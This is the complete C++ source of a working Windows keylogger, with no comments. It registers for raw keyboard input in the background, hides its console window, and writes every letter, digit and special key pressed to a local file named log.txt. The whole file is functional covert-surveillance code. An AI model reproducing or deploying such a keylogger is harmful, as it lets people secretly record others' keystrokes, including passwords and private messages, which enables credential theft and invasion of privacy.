#define WINVER 0x0501
#include <windows.h>
#include <fstream>
#include <string>

HWND hWnd;
UINT dwSize;
RAWINPUTDEVICE rid;
PRAWINPUT d = NULL;
std::fstream f;
std::string tmp;

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
	switch (message) {
	case WM_CREATE:
		rid.dwFlags = RIDEV_NOLEGACY | RIDEV_INPUTSINK | RIDEV_NOHOTKEYS;
		rid.usUsagePage = 1;
		rid.usUsage = 6;
		rid.hwndTarget = hWnd;
		RegisterRawInputDevices(&rid, 1, sizeof(rid));
		break;

	case WM_INPUT:
		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER)) == 0) {
			d = new RAWINPUT[dwSize];
			if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, d, &dwSize, sizeof(RAWINPUTHEADER)) == dwSize) {
				if (d->data.keyboard.Message == WM_KEYDOWN || d->data.keyboard.Message == WM_SYSKEYDOWN) {
					if ((d->data.keyboard.VKey >= 65 && d->data.keyboard.VKey <= 90) || (d->data.keyboard.VKey >= 48 && d->data.keyboard.VKey <= 57)) {
						tmp = char(d->data.keyboard.VKey);
					} else {
						switch (d->data.keyboard.VKey) {
						case VK_BACK:
							tmp = "#BACK";
							break;
						case VK_TAB:
							tmp = "#TAB";
							break;
						case VK_CLEAR:
							tmp = "#CLEAR";
							break;
						case VK_RETURN:
							tmp = "#ENTER";
							break;
						case VK_SHIFT:
							tmp = "#SHIFT";
							break;
						case VK_CONTROL:
							tmp = "#CTRL";
							break;
						case VK_MENU:
							tmp = "#ALT";
							break;
						case VK_CAPITAL:
							tmp = "#CAPS_LOCK";
							break;
						case VK_ESCAPE:
							tmp = "#ESC";
							break;
						case VK_SPACE:
							tmp = "#SPACEBAR";
							break;
						case VK_DELETE:
							tmp = "#DEL";
							break;
						case VK_NUMPAD0:
							tmp = "#NUMPAD0";
							break;
						case VK_NUMPAD1:
							tmp = "#NUMPAD1";
							break;
						case VK_NUMPAD2:
							tmp = "#NUMPAD2";
							break;
						case VK_NUMPAD3:
							tmp = "#NUMPAD3";
							break;
						case VK_NUMPAD4:
							tmp = "#NUMPAD4";
							break;
						case VK_NUMPAD5:
							tmp = "#NUMPAD5";
							break;
						case VK_NUMPAD6:
							tmp = "#NUMPAD6";
							break;
						case VK_NUMPAD7:
							tmp = "#NUMPAD7";
							break;
						case VK_NUMPAD8:
							tmp = "#NUMPAD8";
							break;
						case VK_NUMPAD9:
							tmp = "#NUMPAD9";
							break;
						case VK_NUMLOCK:
							tmp = "#NUMLOCK";
							break;
						case VK_MULTIPLY:
							tmp = "#MULTIPLY";
							break;
						case VK_ADD:
							tmp = "#ADD";
							break;
						case VK_SUBTRACT:
							tmp = "#SUBTRACT";
							break;
						case VK_DECIMAL:
							tmp = "#DECIMAL";
							break;
						case VK_DIVIDE:
							tmp = "#DIVIDE";
							break;
						default:
							tmp = "#UNKNOWN";
							break;
						}
					}
					f.open("log.txt", std::ofstream::app);
					f << tmp << "\n";
					f.close();
				}
			}
			delete[] d;
		}
		break;
	default:
		return DefWindowProcA(hWnd, message, wParam, lParam);
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	MSG msg = {};
	WNDCLASS wc = {};

	wc.lpfnWndProc = WndProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = "x";

	RegisterClassA(&wc);
	hWnd = CreateWindowExA(0, wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);

	while (GetMessageA(&msg, hWnd, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	}
	return msg.wParam;
}
